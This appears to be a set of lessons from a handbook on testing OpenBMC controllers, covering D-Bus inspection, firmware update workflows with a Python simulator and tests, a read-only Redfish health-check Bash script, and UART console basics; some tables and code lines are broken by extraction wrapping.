lessons.title: Best practices
lessons.body:
- Always verify names on the target; never assume from another platform.

- Keep a per-image baseline of services, D-Bus names and resource use.

- Translate API failures into “which service and object?” questions.

lessons.title: What D-Bus is
lessons.body: **D-Bus** is an IPC system: a bus daemon routes messages between connected processes. There are usually two buses: the **system bus** (for system services — the one OpenBMC uses) and per-user **session buses** (desktop applications).

lessons.title: Core concepts
lessons.body:
| Concept | Meaning | OpenBMC-style example |
| Bus name | Address of a | xyz.openbmc_project.State.BMC connection. Unique names look like :1.42 ; well-known names are claimed by services |
| Object path | A named object within | /xyz/openbmc_project/state/bmc0 a service, hierarchical like a filesystem |
| Interface | A named set of | xyz.openbmc_project.State.BMC methods, properties and signals an object implements |
| Property | Typed value on an | CurrentBMCState = |
| interface | xyz.openbmc_project.State.BMC.BMCState.Ready |
| Method | Callable function | org.freedesktop.DBus.Properties.Get |
| Signal | Broadcast notification | PropertiesChanged , InterfacesAdded |

Standard interfaces every object usually has: org.freedesktop.DBus.Introspectable `(describe me), org.freedesktop.DBus.Properties (Get/Set/GetAll), org.freedesktop.DBus.Peer` (Ping). OpenBMC services commonly implement org.freedesktop.DBus.ObjectManager (GetManagedObjects returns everything under a path in one call). **Type signatures** you’ll see in busctl output: s string, b boolean, y byte, n/ q int16/ uint16, i/ u int32/uint32, x/ t int64/uint64, d double, o object path, a array, {} dict entry, v variant. Example: as = array of strings; a{sv} = dictionary string→variant.

lessons.title: Why OpenBMC uses D-Bus
lessons.body:
- One consistent way for all daemons to share state and commands.

- Introspection and tooling ( busctl) make the system observable.

- Signals let consumers react to changes (a sensor crossing a threshold, a new log entry) without polling.

- Interfaces are versioned and documented centrally (phosphor-dbus-interfaces).

lessons.title: Service availability and ownership
lessons.body:
```code
busctl status xyz.openbmc_project.State.BMC --no-pager | grep -E 'PID|Unit|Comm'
busctl list --no-pager | grep -F 'xyz.openbmc_project.State.BMC'
systemctl show xyz.openbmc_project.State.BMC.service -p BusName,Type,ActiveState,NRestarts
```

- **No owner** → service down or never acquired its name (look at its journal — a Type=dbus unit failing to claim the name will time out).

- **Owner PID changed** between two checks → the service restarted.

- **Owner exists but calls time out** → the service is hung, possibly blocked on hardware I/O.

lessons.title: Property validation
lessons.body:
When validating, check **type, value range, units and consistency**:

- Type and unit: Value is a double; Unit says degrees C, RPM, volts…

- Range: within MinValue/ MaxValue; not NaN (D-Bus doubles can carry NaN — Redfish then often shows null).

- Availability/functional flags: Available=false or Functional=false explain a null/absent reading.

- Consistency across layers: **sysfs raw value → D-Bus value → Redfish value** should agree (allowing for scaling and update timing).

```code
# Compare the three layers for one sensor (lab, read-only; paths are examples)
cat /sys/class/hwmon/hwmon2/temp1_input                    # 24500 (millidegrees)
busctl get-property xyz.openbmc_project.HwmonTempSensor \
  /xyz/openbmc_project/sensors/temperature/TEMP_INLET xyz.openbmc_project.Sensor.Value
Value  # d 24.5
curl -sk -u "$BMC_USER" https://<bmc>/redfish/v1/Chassis/<chassis-id>/Sensors/<sensor-id> | j
q .Reading
```

( curl -u user without :password prompts for the password, keeping it out of the command line.) If sysfs reads fine but D-Bus is NaN → daemon/config issue. If sysfs fails ( -EIO, - ETIMEDOUT) → driver/hardware. If D-Bus is fine but Redfish is wrong → bmcweb mapping/ association issue. This **layer comparison** is one of the most powerful BMC debugging techniques.

lessons.title: Exercises
lessons.body:
1. Which command shows which systemd unit owns the bus name

```code
xyz.openbmc_project.Logging?
```

2. A Redfish sensor reads null. Write the 3-layer investigation plan.

3. busctl get-property returns Call failed: ... Timeout was reached. Hypotheses?

4. Why is busctl set-property ... RequestedBMCTransition ... not an inspection command?

5. What does signature a{sv} mean?

**Solutions**

1. busctl list | grep xyz.openbmc_project.Logging (unit column) or busctl status `xyz.openbmc_project.Logging.`

2. 1. sysfs/hwmon or driver value; (b) D-Bus Value, Available, Functional; (c) Redfish resource; first layer where data is wrong locates the fault; then logs of that layer.

3. Service hung (blocked on I/O, deadlock), overloaded CPU, or stuck waiting on another D-Bus call; check ps state ( D?), CPU, journal, kernel logs.

4. It requests a BMC state transition — it reboots the BMC ([DISRUPT]).

5. An array of dictionary entries mapping strings to variants (a property map).

lessons.title: Best practices
lessons.body:
- Inspect with list, tree, introspect, get-property; avoid set-property and unknown methods.

- Record bus-name owners (PIDs) at test start/end to detect restarts.

- Use layer comparison to localise faults.

lessons.title: Firmware image and update concepts
lessons.body:
- **Image** — the binary payload: on OpenBMC typically a tarball or a full flash image containing kernel, rootfs (and possibly bootloader), plus a **MANIFEST** (purpose such as BMC/host, version, machine/compatibility) and optional **signature files** used for verification.

- **Purpose** — which component it targets (BMC, host BIOS, PSU, other devices via PLDM firmware update).

- **Version** — string compared before/after update; format is vendor-defined.

- **Activation** — writing the image to flash and making it the next boot image.

- **Redundancy** — dual flash/A-B partitions permit one image to be updated while the other runs.

lessons.title: Update workflow and state transitions (general pattern)
lessons.body:
```code
Upload image ──> Validate (format, MANIFEST, machine, signature, version)
      │                    │fail -> image marked Invalid/Failed, error logged
      v
  Ready ──(activation requested: automatic or explicit)──> Activating (progress 0..100%)
                                                              │fail -> Failed
                                                              v
                                                          Active (pending reboot)
                                                              │ reboot [DISRUPT]
                                                              v
                                         New image boots ──> Verify running version
                                               │fail to boot -> fallback / recovery
```

In OpenBMC’s code-management design, a software object has interface

```code
xyz.openbmc_project.Software.Activation with properties Activation (e.g.  Ready,
Activating, Active, Failed, Invalid, NotReady) and RequestedActivation, plus
xyz.openbmc_project.Software.ActivationProgress with Progress. Through Redfish, clients
```

use **UpdateService** (push the image; implementations support simple-update and/or multipart HTTP push depending on version) and monitor progress via **Task** resources and **FirmwareInventory**. Exact behaviour (e.g. automatic activation and reboot, apply-time options) is **implementation- and version-specific**.

source.section: 19.2 Update workflow and state transitions (general pattern)

lessons.title: Pre-update checks
lessons.body:
1. **Identity:** running version (Redfish FirmwareInventory, /etc/os-release), image version and target machine — is the image for this board?

2. **Health baseline:** failed units, critical logs, sensor count, uptime, boot ID (Chapter 20 health check).

3. **Resources:** free space where the image is staged (often RAM-backed /tmp) and free memory — large images can exhaust both.

4. **Network stability** for the upload (timeouts, a lab network not shared with heavy traffic).

5. **Recovery path** confirmed; serial console capture started (Chapter 21).

6. **No concurrent operations** (another test, another update, host power cycling).

lessons.title: Progress monitoring
lessons.body:
- Poll status at a sensible interval (e.g. 5–10 s) with an **overall timeout** and **stall detection** (no progress change for N seconds).

- Record **every state transition with timestamps**.

- Expect the BMC to become unreachable during reboot; treat “down” as expected only after activation completed and a reboot was requested.

- After reboot: wait with a bounded timeout for API readiness; then verify.

lessons.title: Version verification
lessons.body:
Verify on **more than one layer**:

- Redfish FirmwareInventory active entry / Managers/bmc FirmwareVersion.

- /etc/os-release VERSION_ID via SSH/console.

- **Boot ID changed** (proof of reboot).

- Health check passes (same as baseline, or deviations explained).

A version that didn’t change after an apparently successful update can mean: the reboot didn’t happen; the new image failed to boot and the bootloader **fell back** to the old one; activation wrote to the wrong side; or the version string in the image wasn’t changed. The serial log distinguishes these.

lessons.title: Simulated update workflow (runnable, no hardware)
lessons.body:
The following simulator models the workflow with a fake clock and a monitor that applies timeouts and stall detection. Scenarios: success, bad_signature, stuck, no_return,

```code
rollback.
File: code/ch19/fw_update_sim.py
#!/usr/bin/env python3
"""Simulated firmware-update workflow and monitor (Handbook Chapter 19).
The simulator models the *shape* of a typical BMC update:
    upload -> image Ready -> activation requested -> Activating (progress %)
           -> Active (reboot needed) -> reboot -> verify running version
The state names follow the general pattern used by OpenBMC's
xyz.openbmc_project.Software.Activation interface (Ready, Activating,
Active, Failed), but this is a teaching model, not OpenBMC code. Nothing
here touches real hardware.
Scenarios: success, bad_signature, stuck, no_return, rollback
Usage:
    python3 fw_update_sim.py --scenario stuck --report out.json
"""
from __future__ import annotations
import argparse
import json
import logging
import sys
from dataclasses import asdict, dataclass, field
from typing import List, Optional
log = logging.getLogger("fwsim")
class SimClock:
    """Deterministic fake clock so tests run instantly."""
    def __init__(self) -> None:
        self.t = 0.0
    def now(self) -> float:
        return self.t
    def sleep(self, s: float) -> None:
        self.t += s
@dataclass
class Event:
    t: float
    kind: str
    detail: str
class SimulatedBMC:
    """A fake BMC exposing just enough state for an update workflow."""
    def __init__(self, scenario: str, clock: SimClock, running="2.15.0", new="2.16.0"):
        self.scenario = scenario
        self.clock = clock
        self.running_version = running
        self.new_version = new
        self.activation = "None"
        self.progress = 0
        self.reachable = True
        self._activation_started: Optional[float] = None
        self._reboot_started: Optional[float] = None
    # --- "API" used by the monitor ---------------------------------------
    def upload(self) -> str:
        self.activation = "Failed" if self.scenario == "bad_signature" else "Ready"
        return "img-7f3a"
    def request_activation(self) -> None:
        if self.activation == "Ready":
            self.activation = "Activating"
            self._activation_started = self.clock.now()
    def poll(self) -> dict:
        if self._reboot_started is not None:
            down_for = self.clock.now() - self._reboot_started
            if self.scenario == "no_return" or down_for < 90:
                self.reachable = False
                raise ConnectionError("BMC not reachable (rebooting?)")
            self.reachable = True
            self._reboot_started = None
            if self.scenario == "rollback":
                pass  # came back on the old image
            else:
                self.running_version = self.new_version
        if self.activation == "Activating":
            elapsed = self.clock.now() - (self._activation_started or 0)
            cap = 40 if self.scenario == "stuck" else 100
            self.progress = min(cap, int(elapsed / 3) * 10)
            if self.progress >= 100:
                self.activation = "Active"
        return {"activation": self.activation, "progress": self.progress,
                "running_version": self.running_version}
    def reboot(self) -> None:
        self._reboot_started = self.clock.now()
@dataclass
class UpdateReport:
    scenario: str
    verdict: str = "UNKNOWN"
    failed_stage: Optional[str] = None
    symptom: str = ""
    events: List[Event] = field(default_factory=list)
    timings_s: dict = field(default_factory=dict)
class UpdateMonitor:
    """Drives and monitors the workflow with explicit timeouts and stall detection."""
    def __init__(self, bmc: SimulatedBMC, clock: SimClock, poll_s=5.0,
                 activation_timeout_s=600.0, stall_s=120.0, reboot_timeout_s=600.0):
        self.bmc, self.clock = bmc, clock
        self.poll_s, self.activation_timeout_s = poll_s, activation_timeout_s
        self.stall_s, self.reboot_timeout_s = stall_s, reboot_timeout_s
        self.report = UpdateReport(bmc.scenario)
    def _event(self, kind: str, detail: str) -> None:
        self.report.events.append(Event(round(self.clock.now(), 1), kind, detail))
        log.info("t=%7.1fs %-12s %s", self.clock.now(), kind, detail)
    def _fail(self, stage: str, symptom: str) -> UpdateReport:
        self.report.verdict, self.report.failed_stage, self.report.symptom = "FAIL", stage,
symptom
        self._event("FAIL", f"{stage}: {symptom}")
        return self.report
    def run(self) -> UpdateReport:
        pre = self.bmc.poll()
        old = pre["running_version"]
        self._event("precheck", f"running version {old}, target {self.bmc.new_version}")
        image = self.bmc.upload()
        state = self.bmc.poll()["activation"]
        self._event("upload", f"image {image} activation={state}")
        if state != "Ready":
            return self._fail("verify", f"image not Ready after upload (activation={state})")
        self.bmc.request_activation()
        t0, last_progress, last_change = self.clock.now(), -1, self.clock.now()
        while True:
            st = self.bmc.poll()
            if st["progress"] != last_progress:
                self._event("progress", f"{st['activation']} {st['progress']}%")
                last_progress, last_change = st["progress"], self.clock.now()
            if st["activation"] == "Active":
                break
            if st["activation"] == "Failed":
                return self._fail("activation", "activation reported Failed")
            if self.clock.now() - last_change > self.stall_s:
                return self._fail("activation", f"no progress for {self.stall_s:.0f}s at {las
t_progress}%")
            if self.clock.now() - t0 > self.activation_timeout_s:
                return self._fail("activation", "activation timeout")
            self.clock.sleep(self.poll_s)
        self.report.timings_s["activation"] = round(self.clock.now() - t0, 1)
        self.bmc.reboot()
        self._event("reboot", "reboot requested")
        t1, went_down = self.clock.now(), False
        while True:
            self.clock.sleep(self.poll_s)
            try:
                st = self.bmc.poll()
            except ConnectionError:
                if not went_down:
                    self._event("down", "BMC stopped responding (expected during reboot)")
                went_down = True
                if self.clock.now() - t1 > self.reboot_timeout_s:
                    return self._fail("reboot", f"BMC not back after {self.reboot_timeout_s:.
0f}s")
                continue
            if went_down:
                self._event("up", "BMC responding again")
                break
        self.report.timings_s["reboot"] = round(self.clock.now() - t1, 1)
        running = st["running_version"]
        if running == self.bmc.new_version:
            self._event("verify", f"running {running} as expected")
            self.report.verdict = "PASS"
            return self.report
        return self._fail("verify", f"running {running}, expected {self.bmc.new_version} "
                                    "(possible rollback/fallback to previous image)")
def simulate(scenario: str) -> UpdateReport:
    clock = SimClock()
    return UpdateMonitor(SimulatedBMC(scenario, clock), clock).run()
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Simulated firmware update monitor")
      ap.add_argument("--scenario", default="success",
                      choices=["success", "bad_signature", "stuck", "no_return", "rollback"])
      ap.add_argument("--report", help="write JSON report to this file")
      args = ap.parse_args(argv)
      logging.basicConfig(level=logging.INFO, format="%(message)s")
      rep = simulate(args.scenario)
      print(f"VERDICT: {rep.verdict}" + (f" (stage={rep.failed_stage}: {rep.symptom})"
                                         if rep.failed_stage else ""))
      if args.report:
          with open(args.report, "w", encoding="utf-8") as fh:
              json.dump(asdict(rep), fh, indent=2)
      return 0 if rep.verdict == "PASS" else 1
  if __name__ == "__main__":
      sys.exit(main())
```

**Run:**

```code
python3 fw_update_sim.py --scenario success
python3 fw_update_sim.py --scenario stuck --report stuck.json
python3 -m pytest -q test_fw_update_sim.py     # 7 tests
```

```output
t=   15.0s progress     Activating 40%
```

Tests:

```code
File: code/ch19/test_fw_update_sim.py
  import pytest
  from fw_update_sim import simulate
  @pytest.mark.parametrize("scenario,verdict,stage", [
      ("success", "PASS", None),
      ("bad_signature", "FAIL", "verify"),
      ("stuck", "FAIL", "activation"),
      ("no_return", "FAIL", "reboot"),
      ("rollback", "FAIL", "verify"),
  ])
  def test_scenarios(scenario, verdict, stage):
      rep = simulate(scenario)
    assert rep.verdict == verdict
    assert rep.failed_stage == stage
def test_success_records_timings_and_down_up():
    rep = simulate("success")
    kinds = [e.kind for e in rep.events]
    assert "down" in kinds and "up" in kinds
    assert rep.timings_s["activation"] > 0 and rep.timings_s["reboot"] >= 90
def test_stuck_reports_progress_value():
    rep = simulate("stuck")
    assert "40%" in rep.symptom
```

**What to notice in the design:** the monitor reports the **stage** that failed and the **symptom**, never a root cause — “stuck at 40%” is a symptom; the cause needs logs.

lessons.title: Failed update investigation
lessons.body:
| Failed stage | Evidence to collect | Typical causes |
| Upload | HTTP status/body from | Network timeout, image too |
| UpdateService, client logs, | large, auth/privilege, wrong |
| network timing | endpoint for this version |
| Validation | Event log/journal of the update | Wrong machine/purpose, bad |
| service, image MANIFEST | signature, corrupted file, unsupported format |
| Activation (stuck/failed) | Update service journal, flash- | Flash write errors, insufficient |
| writing messages, dmesg (MTD/ | space/memory, service crash, |
| flash errors), progress history | lock held by another update |
| Reboot | Serial console, previous-boot | Reboot not triggered; new |
| journal tail | image hangs/panics; watchdog during boot |
| Verify | Versions on multiple layers, boot | Fallback to old image, version |
| ID, serial log of boot | string unchanged, wrong side activated |
| Post-update health | Failed units, sensors, logs vs | Configuration migration issues, |
| baseline | incompatible settings, new bugs |

**Evidence package for a failed update:** image file name + checksum ( sha256sum), MANIFEST, running version before/after, timings and state transitions, update-service journal, dmesg, serial capture, Redfish task JSON, health-check reports before and after.

lessons.title: Compatibility and configuration considerations
lessons.body:
- **Machine compatibility** — an image for another board can brick the device; validation should reject it, but tests should verify that rejection rather than rely on it blindly.

- **Version policy** — some platforms block downgrades or require intermediate versions.

- **Settings persistence** — network, users, certificates and other settings must survive the update; check them post-update.

- **Component dependencies** — BMC version vs host firmware/CPLD versions.

lessons.title: Rollback concepts
lessons.body:
- **Automatic fallback** — bootloader boots the alternate image after failed boots (platform-specific).

- **Manual rollback** — activating the previous image (if retained) or flashing an older one; may be blocked by downgrade policy.

- **Verify rollback too:** after a rollback test, verify version, boot ID, health and settings exactly as for an update.

lessons.title: Exercises
lessons.body:
1. Write pass criteria for a BMC firmware update test.

2. Progress stays at 40% for 10 minutes. List evidence to collect before anything else.

3. Version unchanged after reboot. Give three hypotheses and the evidence that distinguishes them.

4. Why compute the image’s SHA-256 before upload?

**Solutions**

1. Upload accepted; activation completed within timeout; BMC went down and came back within timeout; boot ID changed; running version equals target on Redfish and /etc/os-release; no new failed units/critical logs; sensors/inventory match baseline; settings preserved.

2. Update service journal, dmesg, free/ df (memory and staging space), process state of the update daemon ( ps, D state?), Redfish task JSON, serial console; record time.

3. 1. No reboot — boot ID unchanged; (b) fallback after failed boot — serial log shows new image failing then old image booting; (c) version string identical in new image — MANIFEST/ os-release in image shows the same version.

4. To prove the exact image tested and detect corruption in transfer or storage.

lessons.title: Best practices
lessons.body:
- Never update without a recovery path and console capture.

- Treat “stuck” and “rolled back” as symptoms; find the first error.

- Keep image checksums and MANIFESTs with every test result.

lessons.title: What “healthy” means — make it explicit
lessons.body:
A health check is only useful if each check is **specific, bounded and explainable**:

**Pass criterion**

| Area | Check | Interface (example) |
| Availability | Redfish service root | HTTP 200 within 10 s | HTTPS |
| Authentication | Manager resource | HTTP 200 with lab | HTTPS credentials |
| Firmware | Running version | Equals expected | Redfish / os-release |
| Overall BMC state | Manager | OK ; Ready | Redfish / D-Bus Status.Health ; D-Bus |

| documented | failed exceptions) |

lessons.title: BMC availability checks
lessons.body: Layered, as in Chapter 5: route → port → service root → authenticated resource. A single “ping” is not a health check.

lessons.title: Service health checks (SSH or console)
lessons.body:
```code
systemctl is-system-running             # running | degraded | starting | ...
systemctl --failed --no-pager --plain
systemctl show -p NRestarts bmcweb      # compare with baseline
```

lessons.title: API availability
lessons.body:
- Service root /redfish/v1 — unauthenticated by Redfish design; ideal liveness probe.

- An authenticated resource — proves authentication and bmcweb’s backend calls work.

- **Response time** — record it; a slowly growing response time is an early warning (e.g. a leaking or overloaded backend).

lessons.title: Sensor and inventory checks
lessons.body: Compare against a **per-platform baseline** (expected names, count, ranges). A reading of null, a sensor disappearing, or Status.Health not OK are findings. For inventory: expected DIMMs/CPUs/PSUs/fans present with correct part data. Remember Redfish resource IDs (chassis ID, sensor IDs) are **implementation-specific** — discover them from collections ( Members) rather than hard-coding when possible.

lessons.title: Time synchronisation
lessons.body: A wrong BMC clock causes: TLS validation failures (certificates “not yet valid”), misleading log timestamps, wrong event ordering. Check with Redfish Managers/ <id>.DateTime or date -u over SSH; compare with your test host (itself NTP-synchronised). Record the skew in each report.

lessons.title: Resource and storage monitoring
lessons.body:
```code
free; df -h; df -i                       # on the BMC
cat /proc/loadavg
ps -o pid,rss,args | sort -k2 -n | tail  # BusyBox-friendly top memory users (if rss
supported)
```

Track over long runs (Chapter 16). A steadily rising RSS of one daemon across a 24-hour soak is a leak finding even if no test failed.

lessons.title: Reboot validation
lessons.body: Use the Chapter 10 procedure, with the health check run **before and after**: the post-reboot report must match the pre-reboot baseline except for expected differences (uptime, boot ID).

lessons.title: Log collection
lessons.body: Collect (and keep with the test result): journal of current and previous boot, dmesg, Redfish EventLog entries, failed unit status, health-check JSON. Insert test-start markers so you can extract only new entries.

lessons.title: Distinguishing host failures from BMC failures
lessons.body:
The BMC monitors the host, so host problems show up through the BMC. Separate them:

| Observation | Points to |
| Redfish/SSH to BMC slow or failing; BMC services | BMC |

failing

| BMC healthy; Systems/system PowerState Off | Host (or power sequencing) |

unexpectedly; host POST codes stop; host OS unreachable

| Host sensor readings missing (e.g. CPU temps via | Host off/not ready, or the BMC↔host link (PECI/ |
| PECI) while BMC-local sensors are fine | eSPI) |
| SOL console shows host kernel panic | Host OS |
| BMC rebooted (boot ID changed) and host lost | BMC-initiated action or shared power event — |
| power | check BMC logs for power transitions |

lessons.title: Health-check tool: bmc_health.sh
lessons.body:
A read-only Bash tool using Redfish GETs only: explicit checks, timeouts, credentials from environment variables (passed to curl through stdin, so they never appear in the process list), a human-readable table, a JSON report and meaningful exit codes.

```code
File: code/ch20/bmc_health.sh
  #!/usr/bin/env bash
  # bmc_health.sh - read-only BMC health check over Redfish (Handbook Chapter 20)
  #
  # Usage: bmc_health.sh -H host[:port] [-s https|http] [-k] [-t secs] [-o report.json]
  #                      [-e expected_fw] [-m max_clock_skew_s]
  # Credentials: environment variables BMC_USER and BMC_PASS (never on the command line).
  # Exit codes: 0 all PASS (WARN allowed), 1 at least one FAIL, 2 usage, 3 BMC unreachable
  # Requires: bash 4+, curl, jq. Every request uses GET only - nothing is changed on the BMC.
  set -uo pipefail
  host="" scheme="https" insecure=0 tmo=10 report="" expected_fw="" max_skew=120
  usage() {
    echo "Usage: $0 -H host[:port] [-s https|http] [-k] [-t secs] [-o report.json] [-e fw] [-m
  skew_s]" >&2
  }
  while getopts ":H:s:kt:o:e:m:h" opt; do
    case "$opt" in
      H) host="$OPTARG" ;; s) scheme="$OPTARG" ;; k) insecure=1 ;;
      t) tmo="$OPTARG" ;; o) report="$OPTARG" ;; e) expected_fw="$OPTARG" ;;
      m) max_skew="$OPTARG" ;; h) usage; exit 0 ;; *) usage; exit 2 ;;
    esac
  done
  [ -n "$host" ] || { usage; exit 2; }
  case "$scheme" in http|https) ;; *) echo "scheme must be http or https" >&2; exit 2 ;; esac
[[ $tmo =~ ^[0-9]+$ && $max_skew =~ ^[0-9]+$ ]] || { echo "numeric options expected" >&2; exi
t 2; }
for tool in curl jq; do
  command -v "$tool" >/dev/null 2>&1 || { echo "missing required tool: $tool" >&2; exit 2; }
done
base="$scheme://$host"
workdir=$(mktemp -d) || exit 2
trap 'rm -rf -- "$workdir"' EXIT
declare -a names=() statuses=() details=()
record() {
  names+=("$1"); statuses+=("$2"); details+=("$3")
  printf '%-14s %-5s %s\n' "$1" "$2" "$3"
}
# rf_get <path> <outfile> [auth]  -> prints HTTP code ("000" on transport failure)
rf_get() {
  local path="$1" out="$2" auth="${3:-}"
  # Separate 'local': within one 'local' statement, $out would not be set yet.
  local args=(-sS -o "$out" -w '%{http_code}'
              --connect-timeout 5 --max-time "$tmo" -H 'Accept: application/json')
  [ "$insecure" -eq 1 ] && args+=(-k)
  if [ -n "$auth" ]; then
    # Feed credentials through a curl config on stdin so they never appear in 'ps' output.
    printf 'user = "%s:%s"\n' "${BMC_USER:-}" "${BMC_PASS:-}" |
      curl "${args[@]}" -K - "$base$path" 2>>"$workdir/curl.err"
  else
    curl "${args[@]}" "$base$path" 2>>"$workdir/curl.err"
  fi
}
echo "BMC health check: $base  ($(date -u +%FT%TZ))"
printf '%-14s %-5s %s\n' CHECK STATUS DETAIL
# 1. Service root (unauthenticated by Redfish design) - proves TCP + HTTP + bmcweb alive
code=$(rf_get /redfish/v1 "$workdir/root.json")
if [ "$code" = "000" ]; then
  record service_root FAIL "no HTTP response ($(tail -1 "$workdir/curl.err" 2>/dev/null))"
  echo "BMC unreachable - remaining checks skipped" >&2
  exit 3
elif [ "$code" = "200" ]; then
  record service_root PASS "HTTP 200, RedfishVersion $(jq -r '.RedfishVersion // "?"' "$workd
ir/root.json")"
else
  record service_root FAIL "HTTP $code"
fi
# 2. Authenticated manager resource
if [ -z "${BMC_USER:-}" ] || [ -z "${BMC_PASS:-}" ]; then
  record auth SKIP "BMC_USER/BMC_PASS not set; authenticated checks skipped"
else
  code=$(rf_get /redfish/v1/Managers/bmc "$workdir/mgr.json" auth)
  case "$code" in
    200)
      record auth PASS "manager resource readable"
      fw=$(jq -r '.FirmwareVersion // "unknown"' "$workdir/mgr.json")
      health=$(jq -r '.Status.Health // "unknown"' "$workdir/mgr.json")
      if [ -n "$expected_fw" ] && [ "$fw" != "$expected_fw" ]; then
        record firmware FAIL "running $fw, expected $expected_fw"
      else
        record firmware PASS "$fw"
      fi
      case "$health" in
        OK) record bmc_health PASS "Status.Health=OK" ;;
        Warning) record bmc_health WARN "Status.Health=Warning" ;;
        *) record bmc_health FAIL "Status.Health=$health" ;;
      esac
      # 3. Clock skew between BMC and this host
      bmc_time=$(jq -r '.DateTime // empty' "$workdir/mgr.json")
      if [ -n "$bmc_time" ] && bmc_epoch=$(date -u -d "$bmc_time" +%s 2>/dev/null); then
        skew=$(( $(date -u +%s) - bmc_epoch )); skew=${skew#-}
        if (( skew > max_skew )); then record clock WARN "BMC clock differs by ${skew}s"
        else record clock PASS "skew ${skew}s"; fi
      else
        record clock SKIP "DateTime missing or unparsable"
      fi
      ;;
    401|403) record auth FAIL "HTTP $code - credentials or privilege problem" ;;
    *) record auth FAIL "HTTP $code" ;;
  esac
  # 4. Sensors (Thermal resource; newer services also offer ThermalSubsystem/Sensors)
  code=$(rf_get /redfish/v1/Chassis/chassis/Thermal "$workdir/thermal.json" auth)
  if [ "$code" = "200" ]; then
    nulls=$(jq -r '[.Temperatures[]? | select(.ReadingCelsius == null) | .Name] | join(",")'
"$workdir/thermal.json")
    badfans=$(jq -r '[.Fans[]? | select(.Status.Health != "OK") | "\(.Name)=\
(.Status.Health)"] | join(",")' "$workdir/thermal.json")
    ntemp=$(jq '[.Temperatures[]?] | length' "$workdir/thermal.json")
    if [ -n "$nulls" ]; then record sensors FAIL "null readings: $nulls"
    else record sensors PASS "$ntemp temperature readings present"; fi
    if [ -n "$badfans" ]; then record fans FAIL "$badfans"; else record fans PASS "all fans
OK"; fi
  else
    record sensors FAIL "Thermal resource HTTP $code (chassis id may differ on your
platform)"
  fi
  # 5. Event log - count Critical entries
  code=$(rf_get /redfish/v1/Systems/system/LogServices/EventLog/Entries "$workdir/
events.json" auth)
  if [ "$code" = "200" ]; then
    crit=$(jq '[.Members[]? | select(.Severity == "Critical")] | length' "$workdir/
events.json")
    if (( crit > 0 )); then record event_log WARN "$crit Critical entries"
    else record event_log PASS "no Critical entries"; fi
  else
    record event_log SKIP "EventLog HTTP $code (path is implementation-specific)"
  fi
fi
# Summary and JSON report
fails=0 warns=0
for s in "${statuses[@]}"; do
  [ "$s" = FAIL ] && fails=$((fails + 1))
  [ "$s" = WARN ] && warns=$((warns + 1))
done
echo "Result: ${#names[@]} checks, $fails FAIL, $warns WARN"
if [ -n "$report" ]; then
  json='[]'
  for i in "${!names[@]}"; do
    json=$(jq -c --arg n "${names[$i]}" --arg s "${statuses[$i]}" --arg d "${details[$i]}" \
      '. + [{name:$n, status:$s, detail:$d}]' <<<"$json")
  done
  jq -n --arg t "$(date -u +%FT%TZ)" --arg h "$host" --argjson c "$json" \
    --argjson f "$fails" --argjson w "$warns" \
    '{generated_utc:$t, bmc:$h, fails:$f, warns:$w, checks:$c}' > "$report" &&
    echo "JSON report: $report"
  fi
  (( fails == 0 ))
```

lessons.body:
Project 2 (Chapter 28) includes a **mock Redfish server** ( sim/mock_redfish.py) that serves fictional data on 127.0.0.1 over plain HTTP, with scenarios healthy, degraded, backend (503 from the thermal resource) and slow.

```code
degraded

echo "exit=$?"
```

**Actual output (produced by running the tool against the mock, degraded**

**scenario):**

```code
BMC health check: http://127.0.0.1:18444  (2026-10-15T08:22:03Z)
CHECK          STATUS DETAIL
service_root   PASS  HTTP 200, RedfishVersion 1.17.0
auth           PASS  manager resource readable
firmware       PASS  falcon-2.16.0-sim
bmc_health     WARN  Status.Health=Warning
clock          PASS  skew 0s
```

**Other verified behaviours:** with the backend scenario, sensors FAIL Thermal resource `HTTP 503; against a closed port, service_root FAIL no HTTP response (curl: (7) ...) and` exit 3 (unreachable — an infrastructure result, not a product failure); with a wrong `password, auth FAIL HTTP 401 - credentials or privilege problem.`

**Using it on a real lab BMC:** -s https (default), add -k only if the lab BMC uses a self-signed certificate (preferably install the lab CA instead), and adjust resource paths if your chassis is not called chassis (discover with GET /redfish/v1/Chassis). This tool has been verified only against the mock service.

lessons.title: A bug worth learning from
lessons.body:
While developing this tool, the first version declared local path="$1" out="$2" ... args=(-o "$out" ...) in **one** local statement. Inside a single local, $out is not yet set when args is built, so curl -o "" failed and every check reported HTTP with no code. shellcheck flags this (SC2318). The fix is two separate local statements. Lesson: **run**

**shellcheck and test against a simulator before trusting a script.**

lessons.title: Exercises
lessons.body:
1. Add a check that FAILs if the response time of the service root exceeds 2 s (hint:

```code
curl -w '%{time_total}').
```

2. Make the tool discover the first chassis ID from /redfish/v1/Chassis instead of assuming chassis.

3. Why does the tool exit 3 instead of 1 when the BMC is unreachable?

4. How would you extend the tool with SSH-based checks without storing passwords?

**Solutions**

1. Change rf_get to -w '%{http_code} %{time_total}', split the result ( read -r code t `<<<"$out") and compare with awk -v t="$t" 'BEGIN{exit !(t > 2.0)}'.`

2. rf_get /redfish/v1/Chassis "$workdir/ch.json" auth then chassis_path=$(jq -r `'.Members[0]["@odata.id"]' "$workdir/ch.json") and use "$chassis_path/Thermal".`

3. To separate infrastructure/availability problems from functional failures, so CI can classify results (Chapter 25).

4. Use SSH keys with BatchMode=yes and a fixed list of read-only remote commands (like Chapter 15’s collector), with timeouts.

lessons.title: Best practices
lessons.body:
- One check, one question, one explicit criterion.

- Separate “unreachable” from “unhealthy”.

- Keep baselines per platform and firmware version.

lessons.title: UART fundamentals
lessons.body:
A **UART** (Universal Asynchronous Receiver-Transmitter) sends bytes one bit at a time over a TX line and receives on RX, without a shared clock. Both sides must agree on the frame format:

| Setting | Common BMC value | Meaning |
| Baud rate | 115200 | Bits per second (symbol rate) |
| Data bits | 8 | Bits per character |
| Parity | None | Optional error-check bit (Even/Odd/None) |
| Stop bits | 1 | Frame end marker |
| Flow control | None | Hardware (RTS/CTS) or software (XON/XOFF) |

Written as **115200 8N1**. Values are platform-specific — check documentation or the bootloader/kernel configuration ( console=ttyS4,115200n8 in /proc/cmdline on a running system shows the kernel console device and settings; the device name varies by platform). **Physical connection:** the BMC’s debug UART usually appears on a header or a debug connector; you connect through a USB-to-UART adapter (3.3 V logic on most BMCs — wrong voltage levels can damage hardware; follow your hardware team’s instructions). TX of one side goes to RX of the other, and grounds must be connected. In labs, consoles are often exposed over the network by a console server or ser2net. **Symptoms of wrong settings:** garbage characters (wrong baud rate), nothing at all (wrong TX/RX wiring, wrong port, wrong UART, flow control), output but no input (RX not connected or console input disabled).

lessons.title: Serial console tools
